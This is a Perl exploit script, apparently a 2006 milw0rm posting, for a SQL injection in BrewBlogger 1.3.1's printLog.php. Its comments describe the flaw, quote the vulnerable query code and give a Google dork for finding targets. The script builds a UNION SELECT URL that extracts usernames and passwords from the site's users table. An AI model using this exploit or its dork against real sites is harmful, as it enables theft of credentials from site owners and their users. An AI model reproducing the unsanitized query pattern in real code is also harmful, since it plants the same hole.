#!/usr/bin/perl
###########################################################################################
#Target:
#
#       BewBlogger 1.3.1
#       http://brewblogger.zkdigital.com
#
#Vulnerability:
#
#       SQL Injection
#
#Description:
#
#       BrewBlogger does not properly sanitize the 'id=' parameter passed to printLog.php.
#       Since each user entry contains an auto-incrementing ID number, it is possible to
#       enumerate all user names and passwords stored in the 'users'database by iterating
#       through every possible ID number.
#
#Vulnerable Code (truncated):
#
#       $colname_log = (get_magic_quotes_gpc()) ? $_GET['id'] : addslashes($_GET['id']);
#       $query_log = sprintf("SELECT * FROM brewing WHERE id = %s", $colname_log);
#       $log = mysql_query($query_log, $brewing) or die(mysql_error());
#
#Usage:
#       This script will produce a URL which will reveal the user name and password for
#       the specified ID. If no ID is specified, 2 is used (seems to be the usual ID for
#       the first user). The user name will be listed as "Method:" under 'General
#       Information', and the password will be listed as "Cost:".
#
#Usage:
#       ./brewblog.pl <domain name + path> [user id]
#
#Examples:
#
#       ./brewblogger.pl www.beerblog.com 3
#       ./brewblogger.pl www.mysite.com/beerblog
#
#Google Dork:
#
#       intext:"BrewBlogger for PHP"
#
#Discovery/code:
#
#       Craig Heffner
#       heffnercj [at] gmail.com
#       http://www.craigheffner.com
###########################################################################################


print '
###########################################
# BrewBlogger 1.3.1 SQL Injection Exploit #
#                                         #
# Discovered and coded by: Craig Heffner  #
###########################################
';

if(!$ARGV[0] || $ARGV[0] eq "-h"){
       print "\nUsage: ./brewlogger.pl <domain name + path> [user id]\n\nSee script comments for more details\n";
       exit;
}


if(!$ARGV[1]){
       $id = 2;
} else {
       $id = $ARGV[1];
}

$url = "http://" . $ARGV[0] . "/printLog.php?id=0+UNION+SELECT+";
$a = 1;

while($a < 211){
       if($a == 8){
               $string .= "user_name,";
       } elsif($a == 9){
               $string .= "password,";
       } elsif($a == 210){
               $string .= "1";
       } else {
               $string .= "1,";
       }
       $a++;
}

print "\n\nUse the following URL:\n\n" . $url . $string . "+FROM+users+WHERE+id=" . $id . "\n";
exit;

# milw0rm.com [2006-11-10]